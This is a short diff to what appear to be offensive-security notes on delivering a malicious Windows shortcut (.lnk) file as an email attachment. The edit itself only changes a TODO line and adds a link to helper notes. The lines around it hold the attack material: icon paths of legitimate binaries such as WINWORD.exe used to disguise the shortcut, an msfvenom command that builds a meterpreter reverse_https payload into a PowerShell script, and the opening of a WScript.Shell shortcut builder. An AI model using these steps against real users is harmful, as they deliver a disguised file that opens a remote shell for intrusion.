@@ -5,6 +5,8 @@
 
 ## 01 - Custom Icons
 
+TODO: Add custom icons from the [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Helpers|helpers]].
+
 ```
 C:\Windows\System32\msi.dll
 C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
@@ -21,7 +23,7 @@ C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
 $ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > payload.ps1
 ```
 
-TODO: Remove timestamps in the .lnk file
+Then generate the `.lnk` payload.
 
 ```powershell
 $WScriptShell = New-Object -ComObject WScript.Shell
